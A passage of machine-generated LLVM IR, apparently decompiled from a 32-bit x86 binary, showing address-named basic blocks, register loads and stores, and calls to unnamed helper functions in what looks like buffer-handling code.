  %v1_8049559 = inttoptr i32 %v0_8049559 to i32*
  %v2_8049559 = load i32, i32* %v1_8049559, align 4
  %v11_8049559 = icmp eq i32 %v2_8049559, 1
  store i1 %v11_8049559, i1* %zf.global-to-local, align 1
  br i1 %v11_8049559, label %dec_label_pc_8049636, label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_8049550, %dec_label_pc_8049636, %dec_label_pc_80495dc
  %v0_8049562 = load i32, i32* @esp, align 4
  %v1_8049562 = add i32 %v0_8049562, 92
  %v2_8049562 = inttoptr i32 %v1_8049562 to i32*
  %v3_8049562 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049562, i32* %ecx.global-to-local, align 4
  %v1_8049566 = add i32 %v3_8049562, 12
  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  %v3_8049566 = load i32, i32* %v2_8049566, align 4
  store i32 %v3_8049566, i32* %eax.global-to-local, align 4
  %v1_8049569 = icmp eq i32 %v3_8049566, 0
  store i1 %v1_8049569, i1* %zf.global-to-local, align 1
  %v1_804956b = icmp eq i1 %v1_8049569, false
  br i1 %v1_804956b, label %dec_label_pc_804958e, label %dec_label_pc_804956d

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8049562
  %v1_804956d = add i32 %v3_8049562, 8
  %v2_804956d = inttoptr i32 %v1_804956d to i32*
  %v3_804956d = load i32, i32* %v2_804956d, align 4
  %v12_804956d = icmp eq i32 %v3_804956d, 1
  store i1 %v12_804956d, i1* %zf.global-to-local, align 1
  br i1 %v12_804956d, label %dec_label_pc_80496da, label %dec_label_pc_8049577

dec_label_pc_8049577:                             ; preds = %dec_label_pc_804956d
  %v3_8049577 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049577, i32* %ecx.global-to-local, align 4
  %v1_804957b = add i32 %v3_8049577, 660
  %v2_804957b = inttoptr i32 %v1_804957b to i32*
  %v3_804957b = load i32, i32* %v2_804957b, align 4
  %v1_8049581 = load i32, i32* @ebx, align 4
  %v2_8049581 = sub i32 %v3_804957b, %v1_8049581
  %v12_8049581 = icmp eq i32 %v2_8049581, 0
  store i32 %v2_8049581, i32* %eax.global-to-local, align 4
  %v2_8049583 = add i32 %v3_8049577, 12
  %v3_8049583 = inttoptr i32 %v2_8049583 to i32*
  store i32 %v2_8049581, i32* %v3_8049583, align 4
  store i1 %v12_8049581, i1* %zf.global-to-local, align 1
  br i1 %v12_8049581, label %dec_label_pc_8049af8, label %dec_label_pc_804958e

dec_label_pc_804958e:                             ; preds = %dec_label_pc_8049577, %dec_label_pc_8049562, %dec_label_pc_80496da, %dec_label_pc_8049764
  %v0_804958e = load i32, i32* @ebx, align 4
  %v1_804958e = icmp eq i32 %v0_804958e, 0
  store i1 %v1_804958e, i1* %zf.global-to-local, align 1
  br i1 %v1_804958e, label %dec_label_pc_80495e0, label %dec_label_pc_8049592

dec_label_pc_8049592:                             ; preds = %dec_label_pc_804958e
  %v0_8049592 = load i32, i32* @esp, align 4
  %v1_8049592 = add i32 %v0_8049592, 92
  %v2_8049592 = inttoptr i32 %v1_8049592 to i32*
  %v3_8049592 = load i32, i32* %v2_8049592, align 4
  store i32 %v3_8049592, i32* %edx.global-to-local, align 4
  %v1_8049596 = add i32 %v3_8049592, 660
  %v2_8049596 = inttoptr i32 %v1_8049596 to i32*
  %v3_8049596 = load i32, i32* %v2_8049596, align 4
  %v2_804959c = sub i32 %v3_8049596, %v0_804958e
  %v12_804959c = icmp eq i32 %v2_804959c, 0
  store i1 %v12_804959c, i1* %zf.global-to-local, align 1
  store i32 %v2_804959c, i32* %eax.global-to-local, align 4
  store i32 %v2_804959c, i32* %v2_8049596, align 4
  %v0_80495a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80495a4 = load i32, i32* @esp, align 4
  %v2_80495a4 = add i32 %v1_80495a4, -4
  %v3_80495a4 = inttoptr i32 %v2_80495a4 to i32*
  store i32 %v0_80495a4, i32* %v3_80495a4, align 4
  %v0_80495a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80495a5 = add i32 %v1_80495a4, -8
  %v3_80495a5 = inttoptr i32 %v2_80495a5 to i32*
  store i32 %v0_80495a5, i32* %v3_80495a5, align 4
  %v0_80495a6 = load i32, i32* @esi, align 4
  %v1_80495a6 = load i32, i32* @ebx, align 4
  %v2_80495a6 = add i32 %v1_80495a6, %v0_80495a6
  store i32 %v2_80495a6, i32* %eax.global-to-local, align 4
  %v2_80495a9 = add i32 %v1_80495a4, -12
  %v3_80495a9 = inttoptr i32 %v2_80495a9 to i32*
  store i32 %v2_80495a6, i32* %v3_80495a9, align 4
  %v0_80495aa = load i32, i32* @esi, align 4
  %v2_80495aa = add i32 %v1_80495a4, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495aa, i32* %v3_80495aa, align 4
  %v4_80495ab = call i32 @function_8052753(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80495ab, i32* %eax.global-to-local, align 4
  %v0_80495b0 = load i32, i32* @esp, align 4
  %v1_80495b0 = add i32 %v0_80495b0, 108
  %v2_80495b0 = inttoptr i32 %v1_80495b0 to i32*
  %v3_80495b0 = load i32, i32* %v2_80495b0, align 4
  store i32 %v3_80495b0, i32* %ecx.global-to-local, align 4
  %v1_80495b4 = add i32 %v0_80495b0, 92
  %v2_80495b4 = inttoptr i32 %v1_80495b4 to i32*
  %v3_80495b4 = load i32, i32* %v2_80495b4, align 4
  store i32 %v3_80495b4, i32* %edx.global-to-local, align 4
  %v1_80495b8 = add i32 %v3_80495b0, 660
  %v2_80495b8 = inttoptr i32 %v1_80495b8 to i32*
  %v3_80495b8 = load i32, i32* %v2_80495b8, align 4
  store i32 %v3_80495b8, i32* %eax.global-to-local, align 4
  %v1_80495c1 = icmp eq i32 %v3_80495b8, 0
  store i1 %v1_80495c1, i1* %zf.global-to-local, align 1
  %v2_80495c3 = add i32 %v3_80495b4, 2116
  %v3_80495c3 = add i32 %v2_80495c3, %v3_80495b8
  %v4_80495c3 = inttoptr i32 %v3_80495c3 to i8*
  store i8 0, i8* %v4_80495c3, align 1
  %v0_80495cb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80495cb, label %dec_label_pc_80495e0, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049592
  %v0_80495cd = load i32, i32* @esp, align 4
  %v1_80495cd = add i32 %v0_80495cd, 92
  %v2_80495cd = inttoptr i32 %v1_80495cd to i32*
  %v3_80495cd = load i32, i32* %v2_80495cd, align 4
  store i32 %v3_80495cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_80495d1:                             ; preds = %dec_label_pc_8049521, %dec_label_pc_80495cd
  %v0_8049542 = phi i32 [ %v0_80495d1.pre, %dec_label_pc_8049521 ], [ %v3_80495cd, %dec_label_pc_80495cd ]
  %v1_80495d1 = add i32 %v0_8049542, 12
  %v2_80495d1 = inttoptr i32 %v1_80495d1 to i32*
  %v3_80495d1 = load i32, i32* %v2_80495d1, align 4
  store i32 %v3_80495d1, i32* %eax.global-to-local, align 4
  %v1_80495d4 = icmp eq i32 %v3_80495d1, 0
  store i1 %v1_80495d4, i1* %zf.global-to-local, align 1
  %tmp147 = icmp slt i32 %v3_80495d1, 1
  %tmp148 = icmp eq i1 %tmp147, false
  br i1 %tmp148, label %dec_label_pc_8049542, label %dec_label_pc_80495dc

dec_label_pc_80495dc:                             ; preds = %dec_label_pc_80495d1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8049562

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_8049592, %dec_label_pc_804958e
  %v0_80495e0 = load i32, i32* @esp, align 4
  %v1_80495e0 = add i32 %v0_80495e0, 92
  %v2_80495e0 = inttoptr i32 %v1_80495e0 to i32*
  %v3_80495e0 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495e0, i32* %eax.global-to-local, align 4
  %v1_80495e4 = add i32 %v3_80495e0, -1448
  %v2_80495e4 = inttoptr i32 %v1_80495e4 to i8*
  %v3_80495e4 = load i8, i8* %v2_80495e4, align 1
  %v12_80495e4 = icmp eq i8 %v3_80495e4, 7
  store i1 %v12_80495e4, i1* %zf.global-to-local, align 1
  %v1_80495eb = icmp eq i1 %v12_80495e4, false
  br i1 %v1_80495eb, label %dec_label_pc_8048d91, label %dec_label_pc_80495f1

dec_label_pc_80495f1:                             ; preds = %dec_label_pc_80495e0
  %v3_80495f1 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495f1, i32* %edx.global-to-local, align 4
  %v1_80495f5 = add i32 %v3_80495f1, 660
  %v2_80495f5 = inttoptr i32 %v1_80495f5 to i32*
  %v3_80495f5 = load i32, i32* %v2_80495f5, align 4
  %v9_80495f5 = icmp eq i32 %v3_80495f5, 1024
  store i1 %v9_80495f5, i1* %zf.global-to-local, align 1
  %v1_80495ff = icmp eq i1 %v9_80495f5, false
  br i1 %v1_80495ff, label %dec_label_pc_80494dc, label %dec_label_pc_8049605

dec_label_pc_8049605:                             ; preds = %dec_label_pc_80495f1, %dec_label_pc_80494af
  %v1_8049605 = phi i32 [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80495e0, %dec_label_pc_80495f1 ]
  %v0_8049605 = phi i32 [ %v1_80494af, %dec_label_pc_80494af ], [ %v3_80495e0, %dec_label_pc_80495f1 ]
  %v2_8049605 = add i32 %v1_8049605, -4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  store i32 %v0_8049605, i32* %v3_8049605, align 4
  %v1_8049606 = add i32 %v1_8049605, -8
  %v2_8049606 = inttoptr i32 %v1_8049606 to i32*
  store i32 960, i32* %v2_8049606, align 4
  %v1_804960b = add i32 %v1_8049605, 76
  %v2_804960b = inttoptr i32 %v1_804960b to i32*
  %v3_804960b = load i32, i32* %v2_804960b, align 4
  %v1_804960f = add i32 %v3_804960b, 2180
  %v9_804960f = icmp eq i32 %v1_804960f, 0
  store i1 %v9_804960f, i1* %zf.global-to-local, align 1
  store i32 %v1_804960f, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v1_8049605, -12
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v1_804960f, i32* %v3_8049614, align 4
  %v0_8049615 = load i32, i32* @esi, align 4
  %v2_8049615 = add i32 %v1_8049605, -16
  %v3_8049615 = inttoptr i32 %v2_8049615 to i32*
  store i32 %v0_8049615, i32* %v3_8049615, align 4
  %v4_8049616 = call i32 @function_8052753(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v0_804961b = load i32, i32* @esp, align 4
  %v1_804961b = add i32 %v0_804961b, 108
  %v2_804961b = inttoptr i32 %v1_804961b to i32*
  %v3_804961b = load i32, i32* %v2_804961b, align 4
  store i32 %v3_804961b, i32* %ecx.global-to-local, align 4
  %v1_804961f = add i32 %v3_804961b, 660
  %v2_804961f = inttoptr i32 %v1_804961f to i32*
  %v3_804961f = load i32, i32* %v2_804961f, align 4
  %v1_8049628 = add i32 %v3_804961f, -64
  %v6_8049628 = icmp eq i32 %v1_8049628, 0
  store i1 %v6_8049628, i1* %zf.global-to-local, align 1
  store i32 %v1_8049628, i32* %eax.global-to-local, align 4
  store i32 %v1_8049628, i32* %v2_804961f, align 4
  %v0_80494dc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494dc

dec_label_pc_8049636:                             ; preds = %dec_label_pc_8049550
  %v0_8049636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049636 = load i32, i32* @esp, align 4
  %v2_8049636 = add i32 %v1_8049636, -4
  %v3_8049636 = inttoptr i32 %v2_8049636 to i32*
  store i32 %v0_8049636, i32* %v3_8049636, align 4
  %v0_8049637 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049637 = add i32 %v1_8049636, -8
  %v3_8049637 = inttoptr i32 %v2_8049637 to i32*
  store i32 %v0_8049637, i32* %v3_8049637, align 4
  %v1_8049638 = add i32 %v1_8049636, -12
  %v2_8049638 = inttoptr i32 %v1_8049638 to i32*
  store i32 0, i32* %v2_8049638, align 4
  %v1_804963a = add i32 %v1_8049636, -16
  %v2_804963a = inttoptr i32 %v1_804963a to i32*
  store i32 36, i32* %v2_804963a, align 4
  %v3_804963c = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804963c, i32* %eax.global-to-local, align 4
  %v0_8049641 = load i32, i32* @esp, align 4
  %v1_8049641 = add i32 %v0_8049641, -4
  %v2_8049641 = inttoptr i32 %v1_8049641 to i32*
  store i32 11, i32* %v2_8049641, align 4
  %v2_8049643 = add i32 %v0_8049641, -8
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v3_804963c, i32* %v3_8049643, align 4
  %v1_8049644 = add i32 %v0_8049641, 108
  %v2_8049644 = inttoptr i32 %v1_8049644 to i32*
  %v3_8049644 = load i32, i32* %v2_8049644, align 4
  store i32 %v3_8049644, i32* %ecx.global-to-local, align 4
  %v1_8049648 = add i32 %v3_8049644, 660
  %v2_8049648 = inttoptr i32 %v1_8049648 to i32*
  %v3_8049648 = load i32, i32* %v2_8049648, align 4
  store i32 %v3_8049648, i32* %eax.global-to-local, align 4
  %v2_804964e = add i32 %v0_8049641, -12
  %v3_804964e = inttoptr i32 %v2_804964e to i32*
  store i32 %v3_8049648, i32* %v3_804964e, align 4
  %v0_804964f = load i32, i32* @esi, align 4
  %v2_804964f = add i32 %v0_8049641, -16
  %v3_804964f = inttoptr i32 %v2_804964f to i32*
  store i32 %v0_804964f, i32* %v3_804964f, align 4
  %v0_8049650 = call i32 @function_8051d00()
  %v0_8049655 = load i32, i32* @esp, align 4
  %v1_8049658 = add i32 %v0_8049650, 1
  %v8_8049658 = icmp eq i32 %v1_8049658, 0
  store i1 %v8_8049658, i1* %zf.global-to-local, align 1
  store i32 %v1_8049658, i32* %eax.global-to-local, align 4
  br i1 %v8_8049658, label %dec_label_pc_8049562, label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_8049636
  %v2_804965f = add i32 %v0_8049655, 28
  %v3_804965f = inttoptr i32 %v2_804965f to i32*
  store i32 %v1_8049658, i32* %v3_804965f, align 4
  %v0_8049660 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049660 = add i32 %v0_8049655, 24
  %v3_8049660 = inttoptr i32 %v2_8049660 to i32*
  store i32 %v0_8049660, i32* %v3_8049660, align 4
  %v1_8049661 = add i32 %v0_8049655, 20
  %v2_8049661 = inttoptr i32 %v1_8049661 to i32*
  store i32 0, i32* %v2_8049661, align 4
  %v1_8049663 = add i32 %v0_8049655, 16
  %v2_8049663 = inttoptr i32 %v1_8049663 to i32*
  store i32 36, i32* %v2_8049663, align 4
  %v3_8049665 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v0_804966a = load i32, i32* @esp, align 4
  %v1_804966a = add i32 %v0_804966a, -4
  %v2_804966a = inttoptr i32 %v1_804966a to i32*
  store i32 11, i32* %v2_804966a, align 4
  %v2_804966c = add i32 %v0_804966a, -8
  %v3_804966c = inttoptr i32 %v2_804966c to i32*
  store i32 %v3_8049665, i32* %v3_804966c, align 4
  %v1_804966d = add i32 %v0_804966a, 108
  %v2_804966d = inttoptr i32 %v1_804966d to i32*
  %v3_804966d = load i32, i32* %v2_804966d, align 4
  store i32 %v3_804966d, i32* %eax.global-to-local, align 4
  %v1_8049671 = add i32 %v3_804966d, 660
  %v2_8049671 = inttoptr i32 %v1_8049671 to i32*
  %v3_8049671 = load i32, i32* %v2_8049671, align 4
  store i32 %v3_8049671, i32* %eax.global-to-local, align 4
  %v2_8049677 = add i32 %v0_804966a, -12
  %v3_8049677 = inttoptr i32 %v2_8049677 to i32*
  store i32 %v3_8049671, i32* %v3_8049677, align 4
  %v0_8049678 = load i32, i32* @esi, align 4
  %v2_8049678 = add i32 %v0_804966a, -16
  %v3_8049678 = inttoptr i32 %v2_8049678 to i32*
  store i32 %v0_8049678, i32* %v3_8049678, align 4
  %v0_8049679 = call i32 @function_8051d00()
  store i32 %v0_8049679, i32* %eax.global-to-local, align 4
  %v0_804967e = load i32, i32* @esp, align 4
  %v1_8049681 = add i32 %v0_804967e, 28
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  store i32 1, i32* %v2_8049681, align 4
  %v1_8049683 = add i32 %v0_804967e, 24
  %v2_8049683 = inttoptr i32 %v1_8049683 to i32*
  store i32 ptrtoint (i32* @global_var_8054b3a.16 to i32), i32* %v2_8049683, align 4
  %v1_8049688 = add i32 %v0_804967e, 124
  %v2_8049688 = inttoptr i32 %v1_8049688 to i32*
  %v3_8049688 = load i32, i32* %v2_8049688, align 4
  store i32 %v3_8049688, i32* %edx.global-to-local, align 4
  store i32 %v0_8049679, i32* @ebx, align 4
  %v0_804968e = load i32, i32* @esi, align 4
  %v2_804968e = add i32 %v0_804968e, %v0_8049679
  store i32 %v2_804968e, i32* @edi, align 4
  %v1_8049691 = add i32 %v3_8049688, 660
  %v2_8049691 = inttoptr i32 %v1_8049691 to i32*
  %v3_8049691 = load i32, i32* %v2_8049691, align 4
  %v2_8049697 = sub i32 %v3_8049691, %v0_8049679
  %v12_8049697 = icmp eq i32 %v2_8049697, 0
  store i1 %v12_8049697, i1* %zf.global-to-local, align 1
  store i32 %v2_8049697, i32* %eax.global-to-local, align 4
  %v2_8049699 = add i32 %v0_804967e, 20
  %v3_8049699 = inttoptr i32 %v2_8049699 to i32*
  store i32 %v2_8049697, i32* %v3_8049699, align 4
  %v0_804969a = load i32, i32* @edi, align 4
  %v2_804969a = add i32 %v0_804967e, 16
  %v3_804969a = inttoptr i32 %v2_804969a to i32*
  store i32 %v0_804969a, i32* %v3_804969a, align 4
  %v0_804969b = call i32 @function_8051d00()
  store i32 %v0_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v1_80496a0 = add i32 %v0_80496a0, 92
  %v2_80496a0 = inttoptr i32 %v1_80496a0 to i32*
  %v3_80496a0 = load i32, i32* %v2_80496a0, align 4
  store i32 %v3_80496a0, i32* %ecx.global-to-local, align 4
  %v0_80496a4 = load i32, i32* @ebx, align 4
  %v2_80496a4 = add i32 %v0_80496a4, %v0_804969b
  store i32 %v2_80496a4, i32* @ebx, align 4
  %v2_80496a6 = add i32 %v0_80496a0, 56
  %v3_80496a6 = inttoptr i32 %v2_80496a6 to i32*
  store i32 %v2_80496a4, i32* %v3_80496a6, align 4
  %v0_80496ad = load i32, i32* @ebx, align 4
  %v1_80496ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80496ad = add i32 %v0_80496ad, 2115
  %v3_80496ad = add i32 %v2_80496ad, %v1_80496ad
  %v4_80496ad = inttoptr i32 %v3_80496ad to i8*
  store i8 0, i8* %v4_80496ad, align 1
  %v0_80496b5 = load i32, i32* @esp, align 4
  %v1_80496b5 = add i32 %v0_80496b5, 92
  %v2_80496b5 = inttoptr i32 %v1_80496b5 to i32*
  %v3_80496b5 = load i32, i32* %v2_80496b5, align 4
  store i32 %v3_80496b5, i32* %eax.global-to-local, align 4
  %v1_80496b9 = add i32 %v3_80496b5, 16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  %v3_80496b9 = load i32, i32* %v2_80496b9, align 4
  %v4_80496b9 = add i32 %v3_80496b9, -4
  %v9_80496b9 = sub i32 3, %v3_80496b9
  %v10_80496b9 = and i32 %v9_80496b9, %v3_80496b9
  %v11_80496b9 = icmp slt i32 %v10_80496b9, 0
  %v12_80496b9 = icmp eq i32 %v4_80496b9, 0
  store i1 %v12_80496b9, i1* %zf.global-to-local, align 1
  %v13_80496b9 = icmp slt i32 %v4_80496b9, 0
  %v3_80496bd = icmp ne i1 %v13_80496b9, %v11_80496b9
  %v4_80496bd = or i1 %v12_80496b9, %v3_80496bd
  br i1 %v4_80496bd, label %dec_label_pc_8049da3, label %dec_label_pc_80496c3

dec_label_pc_80496c3:                             ; preds = %dec_label_pc_8049da3, %dec_label_pc_804965f, %dec_label_pc_8049db8
  %v0_80496c3 = phi i32 [ %v1_8049dac, %dec_label_pc_8049da3 ], [ %v0_80496b5, %dec_label_pc_804965f ], [ %v0_80496c3.pre, %dec_label_pc_8049db8 ]
  %v1_80496c3 = add i32 %v0_80496c3, 92
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %edx.global-to-local, align 4
  %v1_80496c7 = add i32 %v3_80496c3, 12
  %v2_80496c7 = inttoptr i32 %v1_80496c7 to i32*
  store i32 -1, i32* %v2_80496c7, align 4
  %v0_80496ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80496ce = add i32 %v0_80496ce, -1448
  %v2_80496ce = inttoptr i32 %v1_80496ce to i8*
  store i8 10, i8* %v2_80496ce, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80496da:                             ; preds = %dec_label_pc_804956d
  %v1_80496da = add i32 %v0_8049562, -4
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  store i32 2, i32* %v2_80496da, align 4
  %v1_80496dc = add i32 %v0_8049562, -8
  %v2_80496dc = inttoptr i32 %v1_80496dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_80496dc, align 4
  %v0_80496e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80496e1 = add i32 %v0_80496e1, 660
  %v2_80496e1 = inttoptr i32 %v1_80496e1 to i32*
  %v3_80496e1 = load i32, i32* %v2_80496e1, align 4
  store i32 %v3_80496e1, i32* %eax.global-to-local, align 4
  %v2_80496e7 = add i32 %v0_8049562, -12
  %v3_80496e7 = inttoptr i32 %v2_80496e7 to i32*
  store i32 %v3_80496e1, i32* %v3_80496e7, align 4
  %v0_80496e8 = load i32, i32* @esi, align 4
  %v2_80496e8 = add i32 %v0_8049562, -16
  %v3_80496e8 = inttoptr i32 %v2_80496e8 to i32*
  store i32 %v0_80496e8, i32* %v3_80496e8, align 4
  %v0_80496e9 = call i32 @function_8051d00()
  %v0_80496ee = load i32, i32* @esp, align 4
  %v1_80496f1 = add i32 %v0_80496e9, 1
  %v8_80496f1 = icmp eq i32 %v1_80496f1, 0
  store i1 %v8_80496f1, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f1, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f1, label %dec_label_pc_804958e, label %dec_label_pc_80496f8

dec_label_pc_80496f8:                             ; preds = %dec_label_pc_80496da
  %v1_80496f8 = add i32 %v0_80496ee, 12
  %v2_80496f8 = inttoptr i32 %v1_80496f8 to i32*
  store i32 2, i32* %v2_80496f8, align 4
  %v1_80496fa = add i32 %v0_80496ee, 8
  %v2_80496fa = inttoptr i32 %v1_80496fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_80496fa, align 4
  %v1_80496ff = add i32 %v0_80496ee, 108
  %v2_80496ff = inttoptr i32 %v1_80496ff to i32*
  %v3_80496ff = load i32, i32* %v2_80496ff, align 4
  store i32 %v3_80496ff, i32* %eax.global-to-local, align 4
  %v1_8049703 = add i32 %v3_80496ff, 660
  %v2_8049703 = inttoptr i32 %v1_8049703 to i32*
  %v3_8049703 = load i32, i32* %v2_8049703, align 4
  %v2_8049709 = add i32 %v0_80496ee, 4
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v3_8049703, i32* %v3_8049709, align 4
  %v0_804970a = load i32, i32* @esi, align 4
  %v3_804970a = inttoptr i32 %v0_80496ee to i32*
  store i32 %v0_804970a, i32* %v3_804970a, align 4
  %v0_804970b = call i32 @function_8051d00()
  store i32 %v0_804970b, i32* %eax.global-to-local, align 4
  %v0_8049710 = load i32, i32* @esp, align 4
  %v1_8049710 = add i32 %v0_8049710, 92
  %v2_8049710 = inttoptr i32 %v1_8049710 to i32*
  %v3_8049710 = load i32, i32* %v2_8049710, align 4
  store i32 %v3_8049710, i32* %edx.global-to-local, align 4
  store i32 %v0_804970b, i32* @ebx, align 4
  %v2_8049716 = add i32 %v0_804970b, 2114
  %v3_8049716 = add i32 %v2_8049716, %v3_8049710
  %v4_8049716 = inttoptr i32 %v3_8049716 to i8*
  store i8 0, i8* %v4_8049716, align 1
  %v0_804971e = load i32, i32* @esp, align 4
  %v1_804971e = add i32 %v0_804971e, -4
  %v2_804971e = inttoptr i32 %v1_804971e to i32*
  store i32 1, i32* %v2_804971e, align 4
  %v1_8049720 = add i32 %v0_804971e, -8
  %v2_8049720 = inttoptr i32 %v1_8049720 to i32*
  store i32 ptrtoint (i32* @global_var_8054b29.14 to i32), i32* %v2_8049720, align 4
  %v2_8049725 = add i32 %v0_804971e, -12
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v0_804970b, i32* %v3_8049725, align 4
  %v0_8049726 = load i32, i32* @esi, align 4
  %v2_8049726 = add i32 %v0_804971e, -16
  %v3_8049726 = inttoptr i32 %v2_8049726 to i32*
  store i32 %v0_8049726, i32* %v3_8049726, align 4
  %v0_8049727 = call i32 @function_8051d00()
  %v0_804972c = load i32, i32* @esp, align 4
  %v1_804972c = add i32 %v0_804972c, 32
  %v1_804972f = add i32 %v0_8049727, 1
  %v8_804972f = icmp eq i32 %v1_804972f, 0
  store i1 %v8_804972f, i1* %zf.global-to-local, align 1
  store i32 %v1_804972f, i32* %eax.global-to-local, align 4
  br i1 %v8_804972f, label %dec_label_pc_804974f, label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %dec_label_pc_80496f8
  %v1_8049732 = add i32 %v0_804972c, 28
  %v2_8049732 = inttoptr i32 %v1_8049732 to i32*
  store i32 1, i32* %v2_8049732, align 4
  %v1_8049734 = add i32 %v0_804972c, 24
  %v2_8049734 = inttoptr i32 %v1_8049734 to i32*
  store i32 ptrtoint (i32* @global_var_8054b29.14 to i32), i32* %v2_8049734, align 4
  %v0_8049739 = load i32, i32* @ebx, align 4
  %v2_8049739 = add i32 %v0_804972c, 20
  %v3_8049739 = inttoptr i32 %v2_8049739 to i32*
  store i32 %v0_8049739, i32* %v3_8049739, align 4
  %v0_804973a = load i32, i32* @esi, align 4
  %v2_804973a = add i32 %v0_804972c, 16
  %v3_804973a = inttoptr i32 %v2_804973a to i32*
  store i32 %v0_804973a, i32* %v3_804973a, align 4
  %v0_804973b = call i32 @function_8051d00()
  store i32 %v0_804973b, i32* %eax.global-to-local, align 4
  %v0_8049740 = load i32, i32* @esp, align 4
  %v1_8049740 = add i32 %v0_8049740, 92
  %v2_8049740 = inttoptr i32 %v1_8049740 to i32*
  %v3_8049740 = load i32, i32* %v2_8049740, align 4
  store i32 %v3_8049740, i32* @ecx, align 4
  %v6_8049744 = icmp eq i32 %v0_8049740, -16
  store i1 %v6_8049744, i1* %zf.global-to-local, align 1
  %v2_8049747 = add i32 %v0_804973b, 2116
  %v3_8049747 = add i32 %v2_8049747, %v3_8049740
  %v4_8049747 = inttoptr i32 %v3_8049747 to i8*
  store i8 0, i8* %v4_8049747, align 1
  %v1_804974f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_80496f8, %dec_label_pc_8049732
  %v1_804974f = phi i32 [ %v1_804972c, %dec_label_pc_80496f8 ], [ %v1_804974f.pre, %dec_label_pc_8049732 ]
  %v0_804974f = load i32, i32* @ecx, align 4
  %v2_804974f = add i32 %v1_804974f, -4
  %v3_804974f = inttoptr i32 %v2_804974f to i32*
  store i32 %v0_804974f, i32* %v3_804974f, align 4
  %v0_8049750 = load i32, i32* @ecx, align 4
  %v2_8049750 = add i32 %v1_804974f, -8
  %v3_8049750 = inttoptr i32 %v2_8049750 to i32*
  store i32 %v0_8049750, i32* %v3_8049750, align 4
  %v1_8049751 = add i32 %v1_804974f, -12
  %v2_8049751 = inttoptr i32 %v1_8049751 to i32*
  store i32 16, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @esi, align 4
  %v2_8049753 = add i32 %v1_804974f, -16
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v3_8049754 = call i32 @function_8051d50(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049754, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v1_804975c = icmp eq i32 %v3_8049754, 0
  store i1 %v1_804975c, i1* %zf.global-to-local, align 1
  %v1_8049e5a = add i32 %v0_8049759, 108
  %v2_8049e5a = inttoptr i32 %v1_8049e5a to i32*
  %v3_8049e5a = load i32, i32* %v2_8049e5a, align 4
  br i1 %v1_804975c, label %dec_label_pc_8049e5a, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %edx.global-to-local, align 4
  %v1_8049768 = add i32 %v3_8049754, 2
  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v3_8049e5a, 12
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804958e

